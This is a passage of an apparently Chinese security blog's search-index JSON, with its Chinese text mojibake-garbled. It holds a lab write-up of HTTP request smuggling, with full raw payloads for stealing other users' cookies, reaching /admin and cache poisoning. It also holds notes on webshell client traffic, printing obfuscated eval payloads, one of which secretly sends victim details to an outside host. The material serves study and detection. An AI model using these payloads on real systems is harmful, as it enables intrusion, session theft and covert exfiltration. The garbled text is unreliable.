æˆçš„HTTPèµ°ç§","text":"å‰åç«¯æœåŠ¡å™¨å¯¹äºHTTPè¯·æ±‚å¤„ç†çš„å·®å¼‚é€ æˆçš„HTTPèµ°ç§ Basic For HTTP Smuggling CL-TE https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te å‰ç«¯æœåŠ¡å™¨ä¼˜å…ˆå¤„ç†Content-Length åç«¯æœåŠ¡å™¨ä¼˜å…ˆå¤„ç†Transfer-Encoding 12345678910POST / HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0G å‰ç«¯æœåŠ¡å™¨ä¼˜å…ˆå¤„ç†Content-Length: 6ï¼Œå†…å®¹ä¸º&quot;0\\r\\n\\r\\nG&quot; åç«¯æœåŠ¡å™¨ä¼˜å…ˆå¤„ç†Transfer-Encoding: chunkedï¼Œè®¤ä¸ºæ”¶åˆ°äº†ä¸€ä¸ªå¤§å°ä¸º0çš„æ•°æ®å—ï¼Œä»è€Œå¿½è§†äº†æœ€åçš„G è¿™ä¸ªGåˆ™ç•™åœ¨ç¼“å†²åŒºå†…ï¼Œå½“ä¸‹ä¸€æ¬¡HTTPè¯·æ±‚å‘å‡ºæ—¶ï¼Œä¼šåŠ åœ¨HTTPè¯·æ±‚ä¹‹å‰ å¦‚æœå°†è¿™ä¸ªæ•°æ®åŒ…é‡æ–°å‘ä¸€æ¬¡ï¼Œå°±èƒ½å¾—åˆ°GPOST / HTTP/1.1 TE-CL https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl å‰ç«¯æœåŠ¡å™¨ä¼˜å…ˆå¤„ç†Content-Length åç«¯æœåŠ¡å™¨ä¼˜å…ˆå¤„ç†Transfer-Encoding 12345678910111213141516POST / HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeTransfer-Encoding: chunkedContent-Length: 4Content-Type: application/x-www-form-urlencoded97GPOST / HTTP/1.1Host: lab_id.web-security-academy.netContent-Length: 5Content-Type: application/x-www-form-urlencoded0 å‰ç«¯æœåŠ¡å™¨ä¼˜å…ˆå¤„ç†Transfer-Encoding: chunkedï¼Œè®¤ä¸ºæ”¶åˆ°äº†ä¸¤ä¸ªæ•°æ®å—ï¼Œç¬¬ä¸€ä¸ªæ•°æ®å—å¤§å°ä¸º0x97ï¼Œç¬¬äºŒä¸ªæ•°æ®å—å¤§å°ä¸º0x00ï¼ˆå³æ ‡è¯†åç»­æ— æ•°æ®ï¼‰ åç«¯æœåŠ¡å™¨ä¼˜å…ˆå¤„ç†Content-Length: 6ï¼Œè®¤ä¸ºæ”¶åˆ°äº†ä¸¤ä¸ªHTTPè¯·æ±‚ï¼Œç¬¬ä¸€ä¸ªè¯·æ±‚å†…å®¹ä¸º97ï¼Œç¬¬äºŒä¸ªè¯·æ±‚å†…å®¹ä¸º0\\r\\n\\r\\n è€Œç¬¬äºŒä¸ªè¯·æ±‚åœ¨è§£ææ—¶ï¼Œè¯·æ±‚æ–¹å¼ä¸ºGPOSTï¼Œå³å®Œæˆäº†HTTP Smuggling TE-TE https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header å‰ç«¯æœåŠ¡å™¨ä¼˜å…ˆå¤„ç†ä¸€ä¸ªTransfer-Encoding åç«¯æœåŠ¡å™¨ä¼˜å…ˆå¤„ç†å¦ä¸€ä¸ªTransfer-Encoding 1234567891011121314151617POST / HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeContent-Length: 4Content-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedTransfer-Encoding: xXxYOLOxXx97GPOST / HTTP/1.1Host: lab_id.web-security-academy.netContent-Length: 5Content-Type: application/x-www-form-urlencoded0 å‰ç«¯æœåŠ¡å™¨ä¼˜å…ˆå¤„ç†ç¬¬ä¸€ä¸ªTEï¼ŒTransfer-Encoding: chunkedï¼Œè®¤ä¸ºæ”¶åˆ°äº†ä¸¤ä¸ªæ•°æ®å—ï¼Œç¬¬ä¸€ä¸ªæ•°æ®å—å¤§å°ä¸º0x97ï¼Œç¬¬äºŒä¸ªæ•°æ®å—å¤§å°ä¸º0x00ï¼ˆå³æ ‡è¯†åç»­æ— æ•°æ®ï¼‰ åç«¯æœåŠ¡å™¨ä¼˜å…ˆå¤„ç†ç¬¬äºŒä¸ªTEï¼ŒTransfer-Encoding: xXxYOLOxXxï¼Œæ— æ³•è¯†åˆ«ï¼Œåˆ™æ ¹æ®CLæ¥è¯†åˆ«HTTPè¯·æ±‚æŠ¥æ–‡ 12345678910POST / HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeContent-Length: 4Content-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedTransfer-Encoding: xXxYOLOxXx97 12345678GPOST / HTTP/1.1Host: lab_id.web-security-academy.netContent-Length: 5Content-Type: application/x-www-form-urlencoded0 åˆ™ç¬¬äºŒä¸ªè¯·æ±‚åœ¨è¢«è§£ææ—¶ï¼Œè¯·æ±‚æ–¹å¼ä¸ºGPOSTï¼Œå³å®Œæˆäº†HTTP Smuggling POC For HTTP Smuggling å“åº”404å³å¯éªŒè¯HTTPèµ°ç§æ¼æ´å­˜åœ¨ CL-TE https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses 1234567891011POST / HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeContent-Length: 30Content-Type: application/x-www-form-urlencodedTransfer-Encoding: chunked0POST /404 HTTP/1.1Foo: TE-CL https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses 12345678910111213POST / HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeContent-Length: 4Content-Type: application/x-www-form-urlencodedTransfer-Encoding: chunked14POST /404 HTTP/1.10 Exploit For HTTP Smuggling Reveal Front-End Request Rewriting https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting å‰ç«¯é€šè¿‡ä¸€ä¸ªç‰¹æ®Šçš„æœªçŸ¥HTTPå¤´éƒ¨æ¥ç»™åç«¯ä¼ é€’å®¢æˆ·ç«¯çš„IPåœ°å€ è€Œåç«¯ä»…å…è®¸adminæˆ–æœ¬åœ°è®¿é—®/adminï¼Œåˆ™éœ€è¦è·å–å‰ç«¯æ‰€å‘é€çš„HTTPè¯·æ±‚ 1234567891011121314POST / HTTP/1.1Host: id_lab.web-security-academy.netConnection: closeContent-Length: 155Content-Type: application/x-www-form-urlencodedTransfer-Encoding: chunked0POST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 300search=test CL-TEæ¼æ´ç¯å¢ƒï¼Œé€šè¿‡searchå‚æ•°å€¼çš„å›æ˜¾å¯ä»¥å°†å‰ç«¯æ‰€å‘é€çš„HTTPè¯·æ±‚æ˜¾ç¤ºå‡ºæ¥ 1234567891011120 search results for &#39;testContent-Type: application&#x2F;x-www-form-urlencodedPOST &#x2F; HTTP&#x2F;1.1X-pSjyEZ-Ip: XXX.XX.X.XXXHost: id_lab.web-security-academy.netContent-Length: 155Content-Type: application&#x2F;x-www-form-urlencodedTransfer-Encoding: chunked0POST &#x2F; HTTP&#x2F;1.1Content-&#39; åˆ™å¾—åˆ°äº†æ‰€éœ€çš„HTTPå¤´ åœ¨è¿›è¡Œä¸€æ¬¡HTTPèµ°ç§æ¥è®¿é—®/admin 1234567891011121314POST / HTTP/1.1Host: id_lab.web-security-academy.netConnection: closeContent-Length: 82Content-Type: application/x-www-form-urlencodedTransfer-Encoding: chunked0GET /admin/delete?username=carlos HTTP/1.1X-pSjyEZ-Ip: 127.0.0.1Foo: Capture Other Usersâ€™ Requests https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests å¯ä»¥å€ŸåŠ©ç•™è¨€æ¿åŠŸèƒ½è¿›è¡ŒHTTPèµ°ç§ï¼Œå°†å…¶ä»–ç”¨æˆ·çš„HTTPè¯·æ±‚é™„åŠ ä¸contentå‚æ•°ä¹‹å ä»è€Œåœ¨ç•™è¨€æ¿ä¸­å¾—åˆ°å…¶ä»–ç”¨æˆ·çš„Cookie 123456789101112131415POST /404 HTTP/1.1Host: lab_id.web-security-academy.netConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 255Transfer-Encoding: chunked0POST /post/comment HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 734Cookie: session=f8dQDONY1p4VwPnH76xODdySj5jZGrKScsrf=r7He01UCO2us28da01WI0w4rnpqlRV9b&amp;postId=3&amp;name=a&amp;email=a@a.a&amp;website=http%3a%2f%2fa.a&amp;comment= 1234567891011121314GET / HTTP/1.1Host: lab_id.web-security-academy.netConnection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Chrome/227864Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brAccept-Language: en-USCookie: victim-fingerprint=40HHLq56Pi4ugFHmfdEqHXxe0c7yA09V; secret=HmzO1WU86wcpZ0NDNfCDisKJTQBarFWp; session=DMRf2fxBwIJh8CzkJGAfwnUjdIFxq5G7 Web Cache Poisoning https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning éœ€è¦å¯¹ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œç¼“å­˜æŠ•æ¯’ ç»™å‡ºäº†ä¸€å°expæœåŠ¡å™¨ï¼Œç”¨äºå­˜æ”¾æ¶æ„jsæ–‡ä»¶ 1234567891011121314POST /resources/js/tracking.js HTTP/1.1Host: lab_id.web-security-academy.netContent-Length: 177Transfer-Encoding: chunkedContent-Type: application/x-www-form-urlencoded0GET /post/next?postId=7 HTTP/1.1Host: exp_id.web-security-academy.netContent-Length: 3Content-Type: application/x-www-form-urlencoded1=1 è¿™é‡Œéœ€è¦ä½¿ç”¨ç«™ç‚¹ä¸­çš„302è·³è½¬æ¥è¿›è¡ŒæŠ•æ¯’ï¼Œè·³è½¬è¿‡ç¨‹æœ‰äº›éš¾ä»¥ç†è§£ï¼Œä¸ªäººç†è§£å¦‚ä¸‹ HTTPèµ°ç§çš„URL /post/next?postId=2 ä¼šè¯·æ±‚labæœåŠ¡å™¨è€Œä¸æ˜¯expæœåŠ¡å™¨ï¼Œä»è€Œè§¦å‘è·³è½¬ è§¦å‘è·³è½¬çš„è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨è¯»å–Hostå¤´ï¼Œå¾—åˆ°expæœåŠ¡å™¨çš„ä¸»æœºå å°†expçš„ä¸»æœºåä¸è·³è½¬ç›®æ ‡çš„è·¯å¾„è¿›è¡Œæ‹¼æ¥ï¼Œå¾—åˆ°äº†è·³è½¬ç›®æ ‡çš„URL è·³è½¬è‡³æ¶æ„JSæ–‡ä»¶ å‚è€ƒé“¾æ¥: https://blog.csdn.net/lblblblblzdx/article/details/80386693 https://paper.seebug.org/1048/ https://xz.aliyun.com/t/6878","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://yoloyolo.top/tags/HTTP/"}]},{"title":"Shell_Pcap","slug":"Shell-Pcap","date":"2021-03-12T02:36:09.000Z","updated":"2021-03-17T15:58:55.000Z","comments":true,"path":"2021/03/11/Shell-Pcap/","link":"","permalink":"https://yoloyolo.top/2021/03/11/Shell-Pcap/","excerpt":"çœ‹åˆ°ä¸€å †é¢è¯•é¢˜éƒ½æœ‰æ¶‰åŠåˆ°åé—¨å®¢æˆ·ç«¯çš„æµé‡ç‰¹å¾ï¼Œè¿™é‡Œè‡ªå·±ä½œä¸€äº›è®°å½•","text":"çœ‹åˆ°ä¸€å †é¢è¯•é¢˜éƒ½æœ‰æ¶‰åŠåˆ°åé—¨å®¢æˆ·ç«¯çš„æµé‡ç‰¹å¾ï¼Œè¿™é‡Œè‡ªå·±ä½œä¸€äº›è®°å½• èœåˆ€ èœåˆ€æµé‡é»˜è®¤ä½¿ç”¨Base64ç¼–ç  ç‰¹å¾éå¸¸æ˜æ˜¾ 123pass=@eval%01(base64_decode($_POST[z0]));z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7aWYoQCRfQ09PS0lFWydmMSddIT05NSl7QHNldGNvb2tpZSgnZjEnLDk1KTtAZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly96eGV4cC5jb20vZS8/Y2FpZGFvPScuJF9TRVJWRVJbSFRUUF9IT1NUXS4kX1NFUlZFUltSRVFVRVNUX1VSSV0uJ19QPScua2V5KCRfUE9TVCkpO307ZWNobygifDwtIik7ZGllKCk7z1=RTpcXHBocFN0dWR5XFxQSFBUdXRvcmlhbFxcV1dXXFwxLnBocA== è§£ç ä¹‹åçš„å†…å®¹ 12@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$F=base64_decode($_POST[&quot;z1&quot;]);$P=@fopen($F,&quot;r&quot;);echo(@fread($P,filesize($F)));@fclose($P);if(@$_COOKIE[&#x27;f1&#x27;]!=95)&#123;@setcookie(&#x27;f1&#x27;,95);@file_get_contents(&#x27;http://zxexp.com/e/?caidao=&#x27;.$_SERVER[HTTP_HOST].$_SERVER[REQUEST_URI].&#x27;_P=&#x27;.key($_POST));&#125;;echo(&quot;|&lt;-&quot;);die();E:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\1.php å€¼å¾—ä¸€æçš„æ˜¯ï¼Œ@set_magic_quotes_runtime(0); è¿™æ¡å‘½ä»¤åœ¨php7ä¸­æ— æ³•è¿è¡Œ 12php &gt; set_magic_quotes_runtime(0);PHP Warning: Uncaught Error: Call to undefined function set_magic_quotes_runtime() in php shell code:1 è¿™ç›´æ¥å¯¼è‡´äº†èœåˆ€æ— æ³•åœ¨php7çš„ç¯å¢ƒä¸‹ä½¿ç”¨ å‚æ•°ç‰¹å¾ POST: z0 z1 z2 â€¦ æµé‡ç‰¹å¾ QGluaV9zZXQoImRpc3BsYXlfZXJyb3Jzâ€¦ @eval%01(base64_decode($_POST[z0])); CKnife CKnifeä½¿ç”¨Base64ç¼–ç ï¼ŒåŒæ ·ä¸é€‚ç”¨äºphp7ç¯å¢ƒï¼ŒåŸå› ä¸èœåˆ€ç›¸åŒ 123pass&#x3D;@eval%01(base64_decode($_POST[action]));action&#x3D;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw&#x3D;&#x3D;z1&#x3D;RTpccGhwU3R1ZHlcUEhQVHV0b3JpYWxcV1dXXGluZGV4LnR4dA&#x3D;&#x3D; è§£ç ä¹‹åçš„å†…å®¹ 12@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$F&#x3D;base64_decode($_POST[&quot;z1&quot;]);$P&#x3D;@fopen($F,&quot;r&quot;);echo(@fread($P,filesize($F)));@fclose($P);;echo(&quot;|&lt;-&quot;);die();E:\\phpStudy\\PHPTutorial\\WWW\\index.txt å‚æ•°ç‰¹å¾ POST: z0 z1 z2 â€¦ æµé‡ç‰¹å¾ QGluaV9zZXQoImRpc3BsYXlfZXJyb3Jzâ€¦ @eval%01(base64_decode($_POST[action])); èšå‰‘ default 1pass=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;$output=ob_get_contents();ob_end_clean();echo &quot;7a5cd&quot;;echo @asenc($output);echo &quot;7a6ba&quot;;&#125;ob_start();try&#123;$D=base64_decode($_POST[&quot;0x89edb44048ea7&quot;]);$F=@opendir($D);if($F==NULL)&#123;echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);&#125;else&#123;$M=NULL;$L=NULL;while($N=@readdir($F))&#123;$P=$D.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot; &quot;.$T.&quot; &quot;.@filesize($P).&quot; &quot;.$E.&quot;&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;&#125;catch(Exception $e)&#123;echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die(); base64 12pass=@eval(@base64_decode($_POST[_0xc1ac917e3ce47]));_0xc1ac917e3ce47=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiNmFlNjEiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gImU5YTAwIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0+Z2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs= rot13 12pass=@eval(@str_rot13($_POST[_0x5d1c88d4565e5]));_0x5d1c88d4565e5=@vav_frg(&quot;qvfcynl_reebef&quot;, &quot;0&quot;);@frg_gvzr_yvzvg(0);shapgvba nfrap($bhg)&#123;erghea $bhg;&#125;;shapgvba nfbhgchg()&#123;$bhgchg=bo_trg_pbagragf();bo_raq_pyrna();rpub &quot;22324&quot;;rpub @nfrap($bhgchg);rpub &quot;q0157&quot;;&#125;bo_fgneg();gel&#123;$Q=qveanzr($_FREIRE[&quot;FPEVCG_SVYRANZR&quot;]);vs($Q==&quot;&quot;)$Q=qveanzr($_FREIRE[&quot;CNGU_GENAFYNGRQ&quot;]);$E=&quot;&#123;$Q&#125; &quot;;vs(fhofge($Q,0,1)!=&quot;/&quot;)&#123;sbernpu(enatr(&quot;P&quot;,&quot;M&quot;)nf $Y)vs(vf_qve(&quot;&#123;$Y&#125;:&quot;))$E.=&quot;&#123;$Y&#125;:&quot;;&#125;ryfr&#123;$E.=&quot;/&quot;;&#125;$E.=&quot; &quot;;$h=(shapgvba_rkvfgf(&quot;cbfvk_trgrtvq&quot;))?@cbfvk_trgcjhvq(@cbfvk_trgrhvq()):&quot;&quot;;$f=($h)?$h[&quot;anzr&quot;]:@trg_pheerag_hfre();$E.=cuc_hanzr();$E.=&quot; &#123;$f&#125;&quot;;rpub $E;;&#125;pngpu(Rkprcgvba $r)&#123;rpub &quot;REEBE://&quot;.$r-&gt;trgZrffntr();&#125;;nfbhgchg();qvr(); chr 1pass=@eVAl(cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116).ChR(40).ChR(34).ChR(100).ChR(105).ChR(115).ChR(112).ChR(108).ChR(97).ChR(121).ChR(95).ChR(101).ChR(114).ChR(114).ChR(111).ChR(114).ChR(115).ChR(34).ChR(44).ChR(32).ChR(34).ChR(48).ChR(34).ChR(41).ChR(59).ChR(64).ChR(115).ChR(101).ChR(116).ChR(95).ChR(116).ChR(105).ChR(109).ChR(101).ChR(95).ChR(108).ChR(105).ChR(109).ChR(105).ChR(116).ChR(40).ChR(48).ChR(41).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(41).ChR(123).ChR(114).ChR(101).ChR(116).ChR(117).ChR(114).ChR(110).ChR(32).ChR(36).ChR(111).ChR(117).ChR(116).ChR(59).ChR(125).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(123).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(61).ChR(111).ChR(98).ChR(95).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(111).ChR(110).ChR(116).ChR(101).ChR(110).ChR(116).ChR(115).ChR(40).ChR(41).ChR(59).ChR(111).ChR(98).ChR(95).ChR(101).ChR(110).ChR(100).ChR(95).ChR(99).ChR(108).ChR(101).ChR(97).ChR(110).ChR(40).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(57).ChR(98).ChR(100).ChR(57).ChR(101).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(64).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(56).ChR(102).ChR(52).ChR(54).ChR(56).ChR(34).ChR(59).ChR(125).ChR(111).ChR(98).ChR(95).ChR(115).ChR(116).ChR(97).ChR(114).ChR(116).ChR(40).ChR(41).ChR(59).ChR(116).ChR(114).ChR(121).ChR(123).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(83).ChR(67).ChR(82).ChR(73).ChR(80).ChR(84).ChR(95).ChR(70).ChR(73).ChR(76).ChR(69).ChR(78).ChR(65).ChR(77).ChR(69).ChR(34).ChR(93).ChR(41).ChR(59).ChR(105).ChR(102).ChR(40).ChR(36).ChR(68).ChR(61).ChR(61).ChR(34).ChR(34).ChR(41).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(80).ChR(65).ChR(84).ChR(72).ChR(95).ChR(84).ChR(82).ChR(65).ChR(78).ChR(83).ChR(76).ChR(65).ChR(84).ChR(69).ChR(68).ChR(34).ChR(93).ChR(41).ChR(59).ChR(36).ChR(82).ChR(61).ChR(34).ChR(123).ChR(36).ChR(68).ChR(125).ChR(9).ChR(34).ChR(59).ChR(105).ChR(102).ChR(40).ChR(115).ChR(117).ChR(98).ChR(115).ChR(116).ChR(114).ChR(40).ChR(36).ChR(68).ChR(44).ChR(48).ChR(44).ChR(49).ChR(41).ChR(33).ChR(61).ChR(34).ChR(47).ChR(34).ChR(41).ChR(123).ChR(102).ChR(111).ChR(114).ChR(101).ChR(97).ChR(99).ChR(104).ChR(40).ChR(114).ChR(97).ChR(110).ChR(103).ChR(101).ChR(40).ChR(34).ChR(67).ChR(34).ChR(44).ChR(34).ChR(90).ChR(34).ChR(41).ChR(97).ChR(115).ChR(32).ChR(36).ChR(76).ChR(41).ChR(105).ChR(102).ChR(40).ChR(105).ChR(115).ChR(95).ChR(100).ChR(105).ChR(114).ChR(40).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(41).ChR(41).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(59).ChR(125).ChR(101).ChR(108).ChR(115).ChR(101).ChR(123).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(47).ChR(34).ChR(59).ChR(125).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(34).ChR(59).ChR(36).ChR(117).ChR(61).ChR(40).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(95).ChR(101).ChR(120).ChR(105).ChR(115).ChR(116).ChR(115).ChR(40).ChR(34).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(103).ChR(105).ChR(100).ChR(34).ChR(41).ChR(41).ChR(63).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(112).ChR(119).ChR(117).ChR(105).ChR(100).ChR(40).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(117).ChR(105).ChR(100).ChR(40).ChR(41).ChR(41).ChR(58).ChR(34).ChR(34).ChR(59).ChR(36).ChR(115).ChR(61).ChR(40).ChR(36).ChR(117).ChR(41).ChR(63).ChR(36).ChR(117).ChR(91).ChR(34).ChR(110).ChR(97).ChR(109).ChR(101).ChR(34).ChR(93).ChR(58).ChR(64).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(117).ChR(114).ChR(114).ChR(101).ChR(110).ChR(116).ChR(95).ChR(117).ChR(115).ChR(101).ChR(114).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(112).ChR(104).ChR(112).ChR(95).ChR(117).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(123).ChR(36).ChR(115).ChR(125).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(36).ChR(82).ChR(59).ChR(59).ChR(125).ChR(99).ChR(97).ChR(116).ChR(99).ChR(104).ChR(40).ChR(69).ChR(120).ChR(99).ChR(101).ChR(112).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(36).ChR(101).ChR(41).ChR(123).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(69).ChR(82).ChR(82).ChR(79).ChR(82).ChR(58).ChR(47).ChR(47).ChR(34).ChR(46).ChR(36).ChR(101).ChR(45).ChR(62).ChR(103).ChR(101).ChR(116).ChR(77).ChR(101).ChR(115).ChR(115).ChR(97).ChR(103).ChR(101).ChR(40).ChR(41).ChR(59).ChR(125).ChR(59).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(59).ChR(100).ChR(105).ChR(101).ChR(40).ChR(41).ChR(59)); chr16 1pass=@eVAl(cHr(0x40).ChR(0x69).ChR(0x6e).ChR(0x69).ChR(0x5f).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x28).ChR(0x22).ChR(0x64).ChR(0x69).ChR(0x73).ChR(0x70).ChR(0x6c).ChR(0x61).ChR(0x79).ChR(0x5f).ChR(0x65).ChR(0x72).ChR(0x72).ChR(0x6f).ChR(0x72).ChR(0x73).ChR(0x22).ChR(0x2c).ChR(0x20).ChR(0x22).ChR(0x30).ChR(0x22).ChR(0x29).ChR(0x3b).ChR(0x40).ChR(0x73).ChR(0x65).ChR(0x74).ChR(0x5f).ChR(0x74).ChR(0x69).ChR(0x6d).ChR(0x65).ChR(0x5f).ChR(0x6c).ChR(0x69).ChR(0x6d).ChR(0x69).ChR(0x74).ChR(0x28).ChR(0x30).ChR(0x29).ChR(0x3b).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).ChR(0x69).ChR(0x6f).ChR(0x6e).ChR(0x20).ChR(0x61).ChR(0x73).ChR(0x65).ChR(0x6e).ChR(0x63).ChR(0x28).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x29).ChR(0x7b).ChR(0x72).ChR(0x65).ChR(0x74).ChR(0x75).ChR(0x72).ChR(0x6e).ChR(0x20).ChR(0x24).ChR(0x6f).ChR(0x75).ChR(0x74).ChR(0x3b).ChR(0x7d).ChR(0x3b).ChR(0x66).ChR(0x75).ChR(0x6e).ChR(0x63).ChR(0x74).C